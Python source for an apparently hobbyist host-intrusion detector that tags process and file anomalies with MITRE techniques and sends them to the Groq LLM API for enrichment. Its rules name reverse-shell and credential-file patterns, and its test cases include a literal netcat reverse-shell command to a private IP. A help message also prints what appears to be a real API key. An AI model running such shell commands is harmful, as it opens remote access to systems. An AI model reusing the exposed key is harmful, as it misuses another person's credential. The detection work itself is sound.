#!/usr/bin/env python3
"""
SENTINEL LLM Analysis - Day 8
AI-powered threat analysis using Groq API (Free Tier)
"""

import json
import os
import hashlib
import time
from datetime import datetime
from typing import Dict, Any, Optional

# Try to import groq, fallback to rule-based if not installed
try:
    from groq import Groq
    GROQ_AVAILABLE = True
except ImportError:
    GROQ_AVAILABLE = False
    print("[!] Groq library not installed. Run: pip install groq")
    print("[*] Using rule-based analysis as fallback")

class LLMAnalyzer:
    """AI-powered security analysis using Groq"""
    
    def __init__(self, api_key=None):
        self.api_key = api_key or os.environ.get('GROQ_API_KEY')
        self.analysis_cache = {}
        self.cache_dir = os.path.expanduser('~/sentinel/cache/llm')
        os.makedirs(self.cache_dir, exist_ok=True)
        
        # Initialize Groq client if available
        if GROQ_AVAILABLE and self.api_key:
            self.client = Groq(api_key=self.api_key)
            self.model = "llama-3.3-70b-versatile"  # Fast and capable
        else:
            self.client = None
            if not self.api_key:
                print("[!] No GROQ_API_KEY found. Using rule-based analysis.")
                print("[*] Get a free API key at: https://console.groq.com/keys")
        
    def analyze_threat(self, anomaly_data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Analyze a detected threat and provide context
        """
        # Create cache key from anomaly
        cache_key = self._create_cache_key(anomaly_data)
        
        # Check cache first
        cached = self._check_cache(cache_key)
        if cached:
            return cached
        
        # Get base analysis from rules
        event_type = anomaly_data.get('type', 'unknown')
        event = anomaly_data.get('event', {})
        score = anomaly_data.get('score', 0)
        
        analysis = self._rule_based_analysis(event_type, event, score)
        
        # Enhance with Groq if available
        if self.client:
            enhanced = self._call_groq_api(anomaly_data, analysis)
            if enhanced:
                analysis.update(enhanced)
        
        analysis['timestamp'] = datetime.now().isoformat()
        analysis['analyzer'] = 'Groq-LLM' if self.client else 'Rule-Based'
        
        # Cache result
        self._cache_result(cache_key, analysis)
        
        return analysis
    
    def _create_cache_key(self, data: Dict) -> str:
        """Create hash for caching"""
        event_str = json.dumps(data.get('event', {}), sort_keys=True)
        return hashlib.md5(event_str.encode()).hexdigest()
    
    def _check_cache(self, key: str) -> Optional[Dict]:
        """Check if analysis is cached"""
        cache_file = os.path.join(self.cache_dir, f"{key}.json")
        if os.path.exists(cache_file):
            with open(cache_file, 'r') as f:
                return json.load(f)
        return None
    
    def _cache_result(self, key: str, analysis: Dict):
        """Cache analysis result"""
        cache_file = os.path.join(self.cache_dir, f"{key}.json")
        with open(cache_file, 'w') as f:
            json.dump(analysis, f, indent=2)
    
    def _call_groq_api(self, anomaly: Dict, fallback: Dict) -> Optional[Dict]:
        """Call Groq API for enhanced analysis"""
        try:
            prompt = self._build_analysis_prompt(anomaly, fallback)
            
            response = self.client.chat.completions.create(
                model=self.model,
                messages=[
                    {
                        "role": "system",
                        "content": "You are a senior security analyst. Analyze threats concisely and return JSON."
                    },
                    {
                        "role": "user",
                        "content": prompt
                    }
                ],
                temperature=0.1,
                max_tokens=500,
                response_format={"type": "json_object"}
            )
            
            result = json.loads(response.choices[0].message.content)
            return result
            
        except Exception as e:
            print(f"[!] Groq API error: {e}")
            return None
    
    def _build_analysis_prompt(self, anomaly: Dict, fallback: Dict) -> str:
        """Build prompt for Groq API"""
        return f"""
Analyze this security anomaly detected by SENTINEL:

Type: {anomaly.get('type')}
Score: {anomaly.get('score', 0):.4f} (lower = more anomalous)
Severity: {fallback.get('severity', 'Unknown')}

Event Details:
{json.dumps(anomaly.get('event', {}), indent=2)}

Return a JSON object with:
{{
    "threat_actor_likelihood": "low/medium/high/critical",
    "attack_stage": "recon/initial_access/execution/persistence/privilege_escalation/defense_evasion/credential_access/discovery/lateral_movement/collection/exfiltration/command_and_control/impact",
    "detailed_description": "Brief but specific description of what this threat does",
    "key_indicators": ["indicator1", "indicator2"],
    "recommended_actions": ["action1", "action2"],
    "mitre_techniques": ["T1234.001"]
}}
"""
    
    def _rule_based_analysis(self, event_type: str, event: Dict, score: float) -> Dict:
        """Fallback rule-based analysis"""
        
        cmdline = event.get('cmdline', '').lower()
        path = event.get('path', '').lower()
        
        analysis = {
            'threat_type': 'Unknown',
            'confidence': 'Medium',
            'mitre_techniques': [],
            'description': '',
            'recommendations': []
        }
        
        # Process anomalies
        if event_type == 'process_anomaly':
            if 'nc -e' in cmdline or 'nc -c' in cmdline:
                analysis['threat_type'] = 'Reverse Shell (Netcat)'
                analysis['confidence'] = 'High'
                analysis['mitre_techniques'] = ['T1059', 'T1071.001']
                analysis['description'] = 'Netcat reverse shell detected - attacker attempting remote access'
                analysis['recommendations'] = [
                    'Kill process immediately: kill -9 <PID>',
                    'Block outbound connection with iptables',
                    'Check crontab and systemd for persistence'
                ]
            elif 'python -c' in cmdline and ('pty' in cmdline or 'spawn' in cmdline):
                analysis['threat_type'] = 'Python Reverse Shell'
                analysis['confidence'] = 'High'
                analysis['mitre_techniques'] = ['T1059.006', 'T1071.001']
                analysis['description'] = 'Python-based reverse shell using pty module - interactive shell access'
                analysis['recommendations'] = [
                    'Terminate Python process',
                    'Review Python execution policies',
                    'Check parent process (SSH, web server) for initial access'
                ]
            elif 'base64' in cmdline and ('-d' in cmdline or 'decode' in cmdline):
                analysis['threat_type'] = 'Obfuscated Command Execution'
                analysis['confidence'] = 'Medium'
                analysis['mitre_techniques'] = ['T1027', 'T1059']
                analysis['description'] = 'Base64 encoded command - attacker hiding malicious payload'
                analysis['recommendations'] = [
                    'Decode and analyze base64 content',
                    'Block process if confirmed malicious',
                    'Review command history for similar patterns'
                ]
            elif 'wget' in cmdline and '|' in cmdline:
                analysis['threat_type'] = 'Remote Script Execution'
                analysis['confidence'] = 'High'
                analysis['mitre_techniques'] = ['T1105', 'T1059']
                analysis['description'] = 'Downloading and executing remote script'
                analysis['recommendations'] = [
                    'Block download URL at firewall',
                    'Analyze downloaded script',
                    'Check for additional payloads'
                ]
            else:
                analysis['threat_type'] = 'Suspicious Process Activity'
                analysis['confidence'] = 'Low'
                analysis['description'] = 'Unusual process pattern detected'
                analysis['recommendations'] = ['Investigate process manually']
        
        # File anomalies
        elif event_type == 'file_anomaly':
            if '/etc/shadow' in path:
                analysis['threat_type'] = 'Password File Access'
                analysis['confidence'] = 'Critical' if event.get('is_write') else 'High'
                analysis['mitre_techniques'] = ['T1003.008', 'T1555']
                analysis['description'] = 'Unauthorized access to /etc/shadow - password hashes exposed'
                analysis['recommendations'] = [
                    'Immediately change all user passwords',
                    'Audit all user accounts: cat /etc/passwd',
                    'Check for new sudoers entries'
                ]
            elif '.ssh/id_rsa' in path or '.ssh/id_dsa' in path:
                analysis['threat_type'] = 'SSH Key Theft Attempt'
                analysis['confidence'] = 'Critical'
                analysis['mitre_techniques'] = ['T1552.004', 'T1021.004']
                analysis['description'] = 'Attempt to read SSH private keys - attacker establishing persistence'
                analysis['recommendations'] = [
                    'Rotate all SSH keys immediately',
                    'Review SSH access logs: grep "Accepted" /var/log/auth.log',
                    'Enable SSH key passphrases and 2FA'
                ]
            elif path.endswith('.ko'):
                analysis['threat_type'] = 'Kernel Rootkit Installation'
                analysis['confidence'] = 'Critical'
                analysis['mitre_techniques'] = ['T1014', 'T1547.006']
                analysis['description'] = 'Kernel module (.ko) loading - possible rootkit'
                analysis['recommendations'] = [
                    'Check loaded modules: lsmod',
                    'Run kernel integrity check: debsums -c',
                    'Boot from trusted media and investigate'
                ]
            elif '/root/.bash_history' in path or '/home/' in path and '.bash_history' in path:
                analysis['threat_type'] = 'Command History Theft'
                analysis['confidence'] = 'Medium'
                analysis['mitre_techniques'] = ['T1552.001']
                analysis['description'] = 'Reading shell history - attacker gathering intel'
                analysis['recommendations'] = [
                    'Review recent commands for sensitive info exposure',
                    'Consider clearing sensitive entries from history'
                ]
            else:
                analysis['threat_type'] = 'Suspicious File Access'
                analysis['confidence'] = 'Low'
                analysis['description'] = f'Unusual file access: {path}'
                analysis['recommendations'] = ['Investigate file access context']
        
        # Severity based on score
        if score < -0.7:
            analysis['severity'] = 'CRITICAL'
        elif score < -0.5:
            analysis['severity'] = 'HIGH'
        elif score < -0.3:
            analysis['severity'] = 'MEDIUM'
        else:
            analysis['severity'] = 'LOW'
        
        return analysis
    
    def generate_report(self, analyses: list) -> str:
        """Generate a comprehensive security report"""
        report = []
        report.append("=" * 70)
        report.append("SENTINEL SECURITY INCIDENT REPORT")
        report.append("=" * 70)
        report.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"Total Incidents: {len(analyses)}")
        report.append(f"Analyzer: {'Groq LLM' if self.client else 'Rule-Based'}")
        report.append("")
        
        for i, analysis in enumerate(analyses, 1):
            report.append(f"[INCIDENT #{i}]")
            report.append(f"  Type:        {analysis.get('threat_type', 'Unknown')}")
            report.append(f"  Severity:    {analysis.get('severity', 'Unknown')}")
            report.append(f"  Confidence:  {analysis.get('confidence', 'Unknown')}")
            report.append(f"  MITRE:       {', '.join(analysis.get('mitre_techniques', []))}")
            report.append(f"  Description: {analysis.get('description', 'N/A')}")
            report.append("  Recommendations:")
            for rec in analysis.get('recommendations', []):
                report.append(f"    • {rec}")
            report.append("")
        
        report.append("=" * 70)
        report.append("END OF REPORT")
        report.append("=" * 70)
        
        return "\n".join(report)


# Singleton instance
llm_analyzer = LLMAnalyzer()


# Test
if __name__ == "__main__":
    print("SENTINEL LLM Analysis - Day 8 (Groq)")
    print("=" * 50)
    
    # Check API key
    api_key = os.environ.get('GROQ_API_KEY')
    if api_key:
        print(f"[✓] GROQ_API_KEY found: {api_key[:10]}...")
    else:
        print("[!] No GROQ_API_KEY set - using rule-based mode")
        print("[*] Get free key: https://console.groq.com/keys")
        print("[*] Then: export GROQ_API_KEY='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'")
    
    analyzer = LLMAnalyzer()
    
    # Test cases
    test_cases = [
        {
            'type': 'process_anomaly',
            'event': {
                'cmdline': 'nc -e /bin/bash 10.0.0.1 4444',
                'is_root': True,
                'pid': 9999,
                'comm': 'nc'
            },
            'score': -0.82,
            'severity': 'CRITICAL'
        },
        {
            'type': 'file_anomaly',
            'event': {
                'path': '/etc/shadow',
                'flags': 1,
                'is_write': True,
                'is_root': True
            },
            'score': -0.91,
            'severity': 'CRITICAL'
        }
    ]
    
    print("\n[*] Analyzing threats...\n")
    
    analyses = []
    for i, anomaly in enumerate(test_cases, 1):
        print(f"[Test {i}] {anomaly['type']}")
        analysis = analyzer.analyze_threat(anomaly)
        analyses.append(analysis)
        
        print(f"  Threat:   {analysis['threat_type']}")
        print(f"  Severity: {analysis['severity']}")
        print(f"  MITRE:    {', '.join(analysis.get('mitre_techniques', []))}")
        print()
    
    # Generate report
    print("\n" + analyzer.generate_report(analyses))
    
    print("\n[✓] Day 8 complete!")


